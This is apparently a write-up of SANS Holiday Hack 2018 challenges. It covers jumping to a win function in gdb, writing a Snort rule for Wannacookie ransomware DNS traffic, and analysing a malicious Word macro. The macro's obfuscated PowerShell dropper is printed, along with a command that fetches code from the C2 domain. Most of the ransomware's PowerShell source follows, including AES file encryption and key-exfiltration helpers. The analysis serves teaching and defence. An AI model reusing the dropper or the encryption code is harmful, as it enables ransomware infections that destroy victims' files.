0000000000207d30 t __init_array_start
0000000000001620 T __libc_csu_fini
00000000000015b0 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
                 U __stack_chk_fail@@GLIBC_2.4
0000000000208068 D _edata
0000000000208080 B _end
0000000000001624 T _fini
00000000000008c8 T _init
0000000000000a00 T _start
0000000000000c1e T base64_cleanup
0000000000000c43 T base64_decode
0000000000000bcc T build_decoding_table
0000000000208068 b completed.7696
0000000000208000 W data_start
0000000000208070 B decoded_data
0000000000208078 b decoding_table
0000000000000a30 t deregister_tm_clones
0000000000208020 d encoding_table
                 U exit@@GLIBC_2.2.5
0000000000000b00 t frame_dummy
                 U free@@GLIBC_2.2.5
                 U getenv@@GLIBC_2.2.5
0000000000000b0a T hmac_sha256
00000000000014ca T main
                 U malloc@@GLIBC_2.2.5
                 U memcpy@@GLIBC_2.14
                 U memset@@GLIBC_2.2.5
                 U printf@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
                 U rand@@GLIBC_2.2.5
0000000000000a70 t register_tm_clones
                 U sleep@@GLIBC_2.2.5
00000000000014b7 T sorry
                 U srand@@GLIBC_2.2.5
                 U strlen@@GLIBC_2.2.5
                 U time@@GLIBC_2.2.5
0000000000000f18 T tohex
0000000000208060 D winnermsg
0000000000000fd7 T winnerwinner
```

Everything you see here is a symbol, and the ones with `T` in front are ones that we can actually call, but the ones that start with an underscore ('_') are built-in stuff that we can just ignore for now.

The most interesting function for us is the `winnerwinner` function, so that's what we are going to try and execute.

Let's start by running the binary in gdb, setting a [breakpoint](ftp://ftp.gnu.org/old-gnu/Manuals/gdb/html_node/gdb_27.html) at `main` and then running the binary.

```console
elf@f29506942d48:~$ gdb -q ./sleighbell-lotto 
Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x14ce
(gdb) r
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00005555555554ce in main ()
```

Awesome, now that we are at our breakpoint, we have control of the application because it's paused. So what we can do is use gdb's [jump](https://sourceware.org/gdb/onlinedocs/gdb/Jumping.html) function to move the programs execution to another part of the program, in this case the `winnerwinner` function.

```console
(gdb) jump winnerwinner
Continuing at 0x555555554fdb.

                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 25) exited normally]
```

And there we have it! We won the lottery!

### Ransomware Recovery

Upon successfully completing the Sleigh Bell Lottery CranPI, we can talk to Shinny again for more hints that will allow us to complete the next objective.

<p align="center"><a href="/images/hh18-85.png"><img src="/images/hh18-85.png"></a></p>

For this objective, it seems for this challenge Alabaster Snowball is in dire need of our help. Apparently Santa's file server has been hit with malware, and we need to help Alabaster deal with the malware by completing several tasks.

So knowing this, from Shinny, we go right ,and head back to the badge reader doors. We go inside, and can then speak to Alabaster.

<p align="center"><a href="/images/hh18-86.png"><img src="/images/hh18-86.png"></a></p>

#### Catch the Malware

After talking to Alabaster, we learn that Alabaster started to analyze the malware on his host device (bad idea!) and it encrypted all his files!

Because it seem that this malware is going rampant, we need to create a [Snort Rule](https://blog.rapid7.com/2016/12/09/understanding-and-configuring-snort-rules/)  that will detect the ransomware!

Upon accessing the Snort terminal we are presented with the following output:

```console
  _  __     _             _       _____          _   _      
 | |/ /    (_)           | |     / ____|        | | | |     
 | ' / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___ 
 |  < | '__| | '_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \
 | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/
 |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|
             / ____| __/ |          | |                     
            | (___  |___/  ___  _ __| |_                    
             \___ \| '_ \ / _ \| '__| __|                   
             ____) | | | | (_) | |  | |_                    
            |_____/|_|_|_|\___/|_|_  \__|                   
               |_   _|  __ \ / ____|                        
                 | | | |  | | (___                          
         _____   | | | |  | |\___ \        __               
        / ____| _| |_| |__| |____) |      /_ |              
       | (___  |_____|_____/|_____/ _ __   | |              
        \___ \ / _ \ '_ \/ __|/ _ \| '__|  | |              
        ____) |  __/ | | \__ \ (_) | |     | |              
       |_____/ \___|_| |_|___/\___/|_|     |_|              

============================================================
INTRO:
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your 
  job is to configure snort to alert on ONLY the bad 
  ransomware traffic.

GOAL:
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap

COMPLETION:
  Successfully create a snort rule that matches ONLY
  bad DNS traffic and NOT legitimate user traffic and the 
  system will notify you of your success.
  
  Check out ~/more_info.txt for additional information.

elf@b750a6cc253b:~$
```

So what we need to do is to create a snort rule that will alert __ONLY__ on bad ransomware traffic by adding it to snorts `/etc/snort/rules/local.rules` file. And by traffic they mean [DNS](https://www.cloudflare.com/learning/dns/what-is-dns/) traffic.

The console also tells us to check out `~/more_info.txt` for additional information. So let's do just that before we being.

```console
elf@b750a6cc253b:~$ cat ~/more_info.txt
MORE INFO:
  A full capture of DNS traffic for the last 30 seconds is 
  constantly updated to:

  /home/elf/snort.log.pcap

  You can also test your snort rule by running:

  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf

  This will create an alert file at ~/snort_logs/alert

  This sensor also hosts an nginx web server to access the 
  last 5 minutes worth of pcaps for offline analysis. These 
  can be viewed by logging into:

  http://snortsensor1.kringlecastle.com/

  Using the credentials:
  ----------------------
  Username | elf
  Password | onashelf

  tshark and tcpdump have also been provided on this sensor.

HINT: 
  Malware authors often user dynamic domain names and 
  IP addresses that change frequently within minutes or even 
  seconds to make detecting and block malware more difficult.
  As such, its a good idea to analyze traffic to find patterns
  and match upon these patterns instead of just IP/domains.
```

Okay, so we know that we can access the PCAP's at http://snortsensor1.kringlecastle.com/ which works well for us because we can then use Wireshark, which will provide us with an easier way to analyze all the traffic.

Accessing the Snort Sensor website provides us with the following.

<p align="center"><a href="/images/hh18-87.png"><img src="/images/hh18-87.png"></a></p>

From here, let's choose the latest PCAP and open it in Wireshark.

<p align="center"><a href="/images/hh18-88.png"><img src="/images/hh18-88.png"></a></p>

Upon analyzing the PCAP, we can instantly see a lot of DNS traffic, including lot's of DNS [TXT records](https://en.wikipedia.org/wiki/TXT_record) which are used to provide the ability to associate arbitrary text with a host or other name, such as human readable information about a server, network, data center, or other accounting information.

For those unfamiliar with malware, and how most sophisticated malware functions, I'll exaplin why DNS TXT records are used. Typically this use of DNS is related to the exfiltration of information. Some malware samples make use of DNS TXT record queries and responses to create a bidirectional [Command and Control (C2)](https://www.trendmicro.com/vinfo/us/security/definition/command-and-control-server) channel.

This C2 communication via DNS allows malware to post new information to the server, download new commands, and even allow for the downloading of new droppers or dependencies for the malware.

Now that we kind of understand that, let's go ahead and start digging into the PCAP. 

We see that the first record contains a DNS TXT query to `77616E6E61636F6F6B69652E6D696E2E707331.bughrsaenr.com`, and if we look a little lower we see another DNS TXT query to `77616E6E61636F6F6B69652E6D696E2E707331.rhnubagser.net`.

So unfortunately, we can't just blacklist the domain names or IP's. Reason why is because of the following hint:

> Malware authors often user dynamic domain names and IP addresses that change frequently within minutes or even seconds to make detecting and block malware more difficult. As such, its a good idea to analyze traffic to find patterns and match upon these patterns instead of just IP/domains.

Because malware can use dynamic domain names, through a technique called [DGA or Domain Generating Algorithm](https://blog.malwarebytes.com/security-world/2016/12/explained-domain-generating-algorithm/), it would be kind of impossible to blacklist all possible domains. So we need to look for __patterns__ in the malware.

Now, one thing that really stands out from the malicious DNS requests is that long string before the domain name. It looks rather suspicious, and seems to be in [hex](https://en.wikipedia.org/wiki/Hexadecimal).

So let's see if we can't decode it! 

```console
root@kali:~# echo "77616E6E61636F6F6B69652E6D696E2E707331" | xxd -r -p
wannacookie.min.ps1
```

Okay, that's rather interesting! From the gist of it, it seems the Wanacookie malware is sending hex encoded commands to its C2 servers. We can also see that this hex string is persistent across all of the DNS queries, regardless of the domain name!

Knowing this we can use that to our advantage and build a Snort Rule that will detect any query with that hex string. But before I do that, I want to dig into this malware a little bit more.

If we look back into the malware, you will see that for every DNS TXT query there is a valid response. 

<p align="center"><a href="/images/hh18-89.png"><img src="/images/hh18-89.png"></a></p>

You can also see that there is a valid TXT answer with what seems to be hexadecimal as well.

<p align="center"><a href="/images/hh18-90.png"><img src="/images/hh18-90.png"></a></p>

Let's go ahead and decode that and see what we get.

```console
root@kali:~# echo "2466756e6374696f6e73203d207b66756e6374696f6e20655f645f66696c6528246b65792c202446696c652c2024656e635f697429207b5b627974655b5d5d246b6579203d20246b65793b24537566666978203d2022602e77616e6e61636f6f6b6965223b5b53797374656d2e5265666c656374696f6e2e417373656d626c" | xxd -r -p
$functions = {function e_d_file($key, $File, $enc_it) {[byte[]]$key = $key;$Suffix = "`.wannacookie";[System.Reflection.Assembl
```

Okay, so this is definitely our malware! And it seems to be pulling powershell source code from it's C2.

Right, so without digging to deep into this, let's go ahead and create out snort rule.

For those unfamiliar with Snort rules, below is a quick visual explanation of how a rule is structured.

<p align="center"><a href="/images/hh18-91.png"><img src="/images/hh18-91.png"></a></p>

Let's start off with a skeleton rule that we can edit and create into our snort rule.

```
action protocol Source_IP Source_Port [direction] Dest_IP Dest_Port (Rule Options)
```

So first off we have the [Rule Header](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node29.html) which starts off with an __action__. This action specifies what the rule does. It can send an __alert__, __log__ a packet, and even __drop__ a packet. There are more actions, but for now this is a general example.


For this challenge we want to create a rule that will __alert__ us on bad traffic. So we replace the `actions` portion of the header with `alert`.

```
alert protocol Source_IP Source_Port [direction] Dest_IP Dest_Port (Rule Options)
```

Now we need to configure our protocol. Since this is a DNS query, it's done via [UDP](https://searchnetworking.techtarget.com/definition/UDP-User-Datagram-Protocol). So we change `protocol` to `udp`.

```
alert udp Source_IP Source_Port [direction] Dest_IP Dest_Port (Rule Options)
```

Now we need to configure the IP addresses and ports for the source, our direction (or which direction the traffic is going) and our destination IP and port. 

To make this easy we will change the Source IP/Port and Destination IP/Port to `any`. This way we can pickup on all UDP traffic.

```
alert udp any any [direction] any any (Rule Options)
```

Once we have that configured, let's set up our direction. Snort allows for two direction options: `->` meaning that traffic flows in one direction, and `<>` meaning that traffic is bi-directional.

For this case I just used the one direction flow `->` since DNS queries are usually in a single direction.

```
alert udp any any -> any any (Rule Options)
```

Now all that's left is to configure our [Rule Options](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node27.html). These option can contain multiple items for payload detection and alerting.

One thing we always want to include is the [msg](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node31.html#SECTION00441000000000000000) rule options as this tells the logging and alerting engine what message to print along with the packet dump. This allows for easier identification of what is occurring in the packet.

So let's include a message that alerts on Wannacookie. And just note, always close the rule with a semi colon!

```
alert udp any any -> any any (msg:"Wannacookie C&C Server Connection Detected!";)
```

Awesome, we're almost done! We pretty much have everything setup, except for the [Payload Detection](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node32.html) options. These options are configured to help snort look for specific packets and process them in the way we want to.

The most important option for this the [content](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node32.html#SECTION00451000000000000000) keyword. This option allows us to set rules that search for specific content in the packet payload and trigger response based on that data.

So what we want to search for is the `77616E6E61636F6F6B69652E6D696E2E707331` hexadecimal string that the DNS query uses.

So let's go ahead and add that in. Also, we need to add an [sid](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node31.html#SECTION00444000000000000000) which allows us to identify our snort rules.

Our final Snort rule should look like the one below.

```
alert udp any any -> any any (msg:"Wannacookie C&C Server Connection Detected!"; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:1;)
```

Once we have that, let's return back the our Snort terminal and add in the rule!

```console
elf@01b6899dd81f:~$ vim /etc/snort/rules/local.rules 
elf@01b6899dd81f:~$ cat /etc/snort/rules/local.rules 
# $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert udp any any -> any any (msg:"Wannacookie C&C Server Connection Detected!"; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:1;)
elf@01b6899dd81f:~$
[+] Congratulation! Snort is alerting on all ransomware and only the ransomware!
```

Once completed, talk to Alabaster to complete the first part of the objective.

<p align="center"><a href="/images/hh18-92.png"><img src="/images/hh18-92.png"></a></p>

#### Identify the Domain

Upon talking to Alabaster again after completing the Snort Rule challenge, we learn that Alabaster wants us to assist him in analyzing a [malicious word document](https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip). 

<p align="center"><a href="/images/hh18-93.png"><img src="/images/hh18-93.png"></a></p>

Our objective is to analyze this document and find the domain that it communicates with.

Thankfully for us, Alabaster gives us a good hint on using [olevba](https://github.com/decalage2/oletools/wiki/olevba) to extract word [macros](https://support.office.com/en-us/article/create-or-run-a-macro-c6b99036-905c-49a6-818a-dfb98b7c3c9c). 

<p align="center"><a href="/images/hh18-94.png"><img src="/images/hh18-94.png"></a></p>

Before continuing on with this challenge, I highly suggest you go and watch [Chris Davis's - Analyzing PowerShell Malware](https://www.youtube.com/watch?v=wd12XRq2DNk) KringleCon talk. At the same time I also suggest you go read my blog post on [Reverse Engineering Malicious Macros for Fun & Profit](https://jhalon.github.io/re-malicious-macros/). Both of these will give you a better understanding of how to extract the malicious macros, and how to analyze them.

At the same time, I __HIGHLY SUGGEST__ you do all of your malware analysis in a [Windows VM](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise) to prevent any damage to your host machine.

Once you got the VM up and running, Install [Python](https://www.python.org/downloads/), [olevba](https://github.com/decalage2/oletools/wiki/olevba), and [Wireshark](https://www.wireshark.org/download.html). Also, get a copy of [PowerDump](https://github.com/chrisjd20/power_dump) from github. After that's done, we can continue on!

So for this challenge we got a zip file that contained the malicious `.docm` file, which we were able to extract with the password `elves`.

```console
C:\Users\User\Desktop\Wannacookie>dir
Volume in drive C has no label.
Volume Serial Number is A66E-9523

Directory of C:\Users\User\Desktop\Wannacookie

12/26/2018  05:30 PM  <DIR>  .
12/26/2018  05:30 PM  <DIR>  ..
12/17/2018  09:46 AM  113,540 CHOCOLATE_CHIP_COOKIE_RECIPE.docm
1 File(s)  113,540 bytes
2 Dir(s)  91,299,774,464 bytes free
```

Once we have the file, let's run run `olevba` against it to extract the malicious macro.

```console
C:\Users\User\Desktop\Wannacookie>olevba.exe CHOCOLATE_CHIP_COOKIE_RECIPE.docm
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename
-----------  -----------------------------------------------------------------
OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
===============================================================================
FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_Open()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub

+------------+-----------------+-----------------------------------------+
| Type       | Keyword         | Description                             |
+------------+-----------------+-----------------------------------------+
| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
|            |                 | document is opened                      |
| Suspicious | Shell           | May run an executable file or a system  |
|            |                 | command                                 |
| Suspicious | powershell      | May run PowerShell commands             |
| Suspicious | ExecutionPolicy | May run PowerShell commands             |
| Suspicious | New-Object      | May create an OLE object using          |
|            |                 | PowerShell                              |
| IOC        | powershell.exe  | Executable file name                    |
+------------+-----------------+-----------------------------------------+
```

Awesome! We got our dropper payload! 

Taking a look into the payload, we can see that [iex](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6) or __Invoke-Expression__ is being called against the payload, which initially allows it to execute.

We don't want that to happen! What we do want is to execute the command, but print out it's contents to see what it's actually doing!

So for that to happen we modify the command a bit and get the following. 

```powershell
PS C:\Users\User\Desktop\Wannacookie> powershell.exe -ExecutionPolicy Bypass -C "sal a New-Object; (a IO.StreamReader((a IO.Compress
ion.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1
Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP7
4PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+J
BHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)
),[Text.Encoding]::ASCII)).ReadToEnd() | Out-File dropper.ps1"
```

By using the [Out-File](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-file?view=powershell-6) command, we tell powershell to pipe the output of the executed command into a file. This is done so we can better analyze what the command does.

Once executed, we should see that a new file called `dropper.ps1` was created, which we can go ahead and read.

```powershell
PS C:\Users\User\Desktop\Wannacookie> type .\dropper.ps1
function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; iex($(H2A $h | Out-string))
```

Quickly looking through the script, we see that the [Resolve-DnsName](https://docs.microsoft.com/en-us/powershell/module/dnsclient/resolve-dnsname?view=winserver2012r2-ps) is used to perform a DNS query against the domain name `erohetfanu.com` along with the hex string of `77616E6E61636F6F6B69652E6D696E2E707331` which initially translates to `wannacookie.min.ps1`.

So this dropper downloads the malware from the domain in the script and executes it!

Knowing this, we can go into our badge, and enter `erohetfanu.com` as the domain name that the malware communicates with to complete this portion of the objective.

<p align="center"><a href="/images/hh18-95.png"><img src="/images/hh18-95.png"></a></p>

After this, we can talk to Alabaster to get the next portion of the challenge.

#### Stop the Malware

Upon talking to Alabaster after completing the Domain Identification challenge, we learn that in recent history another ransomware had a killswitch domain that when registered would prevent infection. This would be a direct referecen to the [WanaCry](https://www.endgame.com/blog/technical-blog/wcrywanacry-ransomware-technical-analysis) malware. 

<p align="center"><a href="/images/hh18-96.png"><img src="/images/hh18-96.png"></a></p>

Thankfully, Alabaster also provides us a hint on [Ransomware Kill Switches](https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/) which kind of makes it clear to us that there must be a killswitch for this malware somewhere in the code.

So let's dig back into the code and see if we can't figure it out.

It seems that the malware uses TXT via DNS to transfer the source code as it increments. as seen by the [forEach](https://ss64.com/ps/foreach.html) statement in the dropper.

Like we did previously, let's edit the code slightly to remove the `iex` command, and output the results into a file called `source.ps1`.

```powershell
PS C:\Users\User\Desktop\Wannacookie> function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; ($(H2A $h | Out-string)) | Out-File source.ps1
```

Once executed, give the script a minute or two to run. Afterwards we should have access to the source code.

```console
PS C:\Users\User\Desktop\Wannacookie> ls

	Directory: C:\Users\User\Desktop\Wannacookie

Mode  LastWriteTime  Length Name
----  -------------  ------ ----
-a----  12/17/2018  9:46 AM  113540 CHOCOLATE_CHIP_COOKIE_RECIPE.docm
-a----  12/26/2018  6:05 PM  938 dropper.ps1
-a----  12/26/2018  6:05 PM  16038 source.ps1
```

After cleaning up the source code for readability, we get the following:

```powershell
$functions = { function e_d_file ($key,$File,$enc_it) { [byte[]]$key = $key
    $Suffix = "`.wannacookie"
    [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
    [System.Int32]$KeySize = $key.Length * 8
    $AESP = New-Object 'System.Security.Cryptography.AesManaged'
    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AESP.BlockSize = 128
    $AESP.KeySize = $KeySize
    $AESP.Key = $key
    $FileSR = New-Object System.IO.FileStream ($File,[System.IO.FileMode]::Open)
    if ($enc_it) { $DestFile = $File + $Suffix } else { $DestFile = ($File -replace $Suffix) }
    $FileSW = New-Object System.IO.FileStream ($DestFile,[System.IO.FileMode]::Create)
    if ($enc_it) { $AESP.GenerateIV()
      $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length),0,4)
      $FileSW.Write($AESP.IV,0,$AESP.IV.Length)
      $Transform = $AESP.CreateEncryptor() } else { [Byte[]]$LenIV = New-Object Byte[] 4
      $FileSR.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null
      $FileSR.Read($LenIV,0,3) | Out-Null
      [int]$LIV = [System.BitConverter]::ToInt32($LenIV,0)
      [Byte[]]$IV = New-Object Byte[] $LIV
      $FileSR.Seek(4,[System.IO.SeekOrigin]::Begin) | Out-Null
      $FileSR.Read($IV,0,$LIV) | Out-Null
      $AESP.IV = $IV
      $Transform = $AESP.CreateDecryptor() }
    $CryptoS = New-Object System.Security.Cryptography.CryptoStream ($FileSW,$Transform,[System.Security.Cryptography.CryptoStreamMode]::Write)
    [int]$Count = 0
    [int]$BlockSzBts = $AESP.BlockSize / 8
    [Byte[]]$Data = New-Object Byte[] $BlockSzBts
    do { $Count = $FileSR.Read($Data,0,$BlockSzBts)
      $CryptoS.Write($Data,0,$Count) } while ($Count -gt 0)
    $CryptoS.FlushFinalBlock()
    $CryptoS.Close()
    $FileSR.Close()
    $FileSW.Close()
    Clear-Variable -Name "key"
    Remove-Item $File } }
function H2B { param($HX)
  $HX = $HX -split '(..)' | Where-Object { $_ }
  foreach ($value in $HX) { [Convert]::ToInt32($value,16) } }
function A2H () { param($a)
  $c = ''
  $b = $a.ToCharArray()

  foreach ($element in $b) { $c = $c + " " + [System.String]::Format("{0:X}",[System.Convert]::ToUInt32($element)) }
  return $c -replace ' ' }
function H2A () { param($a)
  $outa
  $a -split '(..)' | Where-Object { $_ } | ForEach-Object { [char]([convert]::ToInt16($_,16)) } | ForEach-Object { $outa = $outa + $_ }
  return $outa }
function B2H { param($DEC)
  $tmp = ''
  foreach ($value in $DEC) { $a = "{0:x}" -f [int]$value
    if ($a.Length -eq 1) { $tmp += '0' + $a } else { $tmp += $a } }
  return $tmp }
function ti_rox { param($b1,$b2)
  $b1 = $(H2B $b1)
  $b2 = $(H2B $b2)
  $cont = New-Object Byte[] $b1.count
  if ($b1.count -eq $b2.count) { for ($i = 0
      $i -lt $b1.count
      $i++) { $cont[$i] = $b1[$i] -bxor $b2[$i] } }
  return $cont }
function B2G { param([byte[]]$Data)
  process { $out = [System.IO.MemoryStream]::new()
    $gStream = New-Object System.IO.Compression.GzipStream $out,([IO.Compression.CompressionMode]::Compress)
    $gStream.Write($Data,0,$Data.Length)
    $gStream.Close()
    return $out.ToArray() } }
function G2B { param([byte[]]$Data)
  process { $SrcData = New-Object System.IO.MemoryStream (,$Data)
    $output = New-Object System.IO.MemoryStream
    $gStream = New-Object System.IO.Compression.GzipStream $SrcData,([IO.Compression.CompressionMode]::Decompress)
    $gStream.CopyTo($output)
    $gStream.Close()
    $SrcData.Close()
    [byte[]]$byteArr = $output.ToArray()
    return $byteArr } }
function sh1 ([string]$String) { $SB = New-Object System.Text.StringBuilder
  [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String)) | ForEach-Object { [void]$SB.Append($_.ToString("x2")) }
  $SB.ToString() }
function p_k_e ($key_bytes,[byte[]]$pub_bytes) { $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
  $cert.Import($pub_bytes)
  $encKey = $cert.PublicKey.Key.Encrypt($key_bytes,$true)
  return $(B2H $encKey) }
function e_n_d { param($key,$allfiles,$make_cookie)
  $tcount = 12
  for ($file = 0
    $file -lt $allfiles.Length
    $file++) { while ($true) { $running = @(Get-Job | Where-Object { $_.State -eq 'Running' })
      if ($running.count -le $tcount) { Start-Job -ScriptBlock { param($key,$File,$true_false)
          try { e_d_file $key $File $true_false } catch { $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -Append } } -args $key,$allfiles[$file],$make_cookie -InitializationScript $functions
        break } else { Start-Sleep -m 200
        continue } } } }
function g_o_dns ($f) { $h = ''
  foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings,10) - 1)) { $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings }
  return (H2A $h) }
function s_2_c ($astring,$size = 32) { $new_arr = @()
  $chunk_index = 0
  foreach ($i in 1..$($astring.Length / $size)) { $new_arr += @($astring.substring($chunk_index,$size))
    $chunk_index += $size }
  return $new_arr }
function snd_k ($enc_k) { $chunks = (s_2_c $enc_k)
